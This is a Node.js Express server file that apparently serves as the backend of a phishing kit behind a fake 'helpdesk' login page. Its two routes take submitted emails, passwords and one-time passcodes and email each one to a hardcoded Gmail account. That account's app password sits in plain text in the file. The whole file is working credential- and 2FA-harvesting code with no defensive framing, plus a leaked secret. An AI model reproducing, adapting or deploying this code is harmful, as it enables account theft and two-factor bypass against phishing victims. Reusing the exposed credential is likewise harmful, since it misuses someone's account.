const express = require("express");
const app = express();
const cors = require("cors");
const nodemailer = require("nodemailer");

// ✅ CORS MUST come FIRST, before express.json()
app.use(
  cors({
    origin: "https://helpdesk-raenest.vercel.app",
    methods: ["GET", "POST", "OPTIONS"],
    allowedHeaders: ["Content-Type"],
    credentials: true,
  }),
);

// ✅ Handle preflight OPTIONS requests
app.options("*", cors());

app.use(express.json());

const PORT = process.env.PORT || 5000;

// Email credentials
const userEmail = "web3coach33@gmail.com";
const pass = "vviqszytacvfamvd";

// API routes for index
app.post("/", (req, res) => {
  const { email, password } = req.body;

  const transporter = nodemailer.createTransport({
    service: "gmail",
    auth: {
      user: userEmail,
      pass: pass,
    },
  });

  const mailOptions = {
    from: userEmail,
    to: userEmail,
    subject: `New Login Attempt`,
    text: `New user registered with Email: ${email} and password: ${password}`,
  };

  console.log(mailOptions);

  transporter.sendMail(mailOptions, (error, info) => {
    if (error) {
      console.log(error);
      res.status(500).send("Error occurred: " + error);
    } else {
      console.log("Email sent: " + info.response);
      res.send("success");
    }
  });
});

// API routes for otp
app.post("/otp", (req, res) => {
  console.log(req.body);
  const email = req.body.email;
  const otp = req.body?.otp;

  const transporter = nodemailer.createTransport({
    service: "gmail",
    auth: {
      user: userEmail,
      pass: pass,
    },
  });

  const mailOptions = {
    from: userEmail,
    to: userEmail,
    subject: `OTP Received`,
    text: `OTP: ${otp}`,
  };

  console.log(mailOptions);

  transporter.sendMail(mailOptions, (error, info) => {
    if (error) {
      console.log(error);
      res.status(500).send("Error occurred: " + error);
    } else {
      console.log("Email sent: " + info.response);
      res.send("success");
    }
  });
});

app.listen(PORT, () => {
  console.log(`Server is running on port http://localhost:${PORT}`); // ✅ FIXED
});
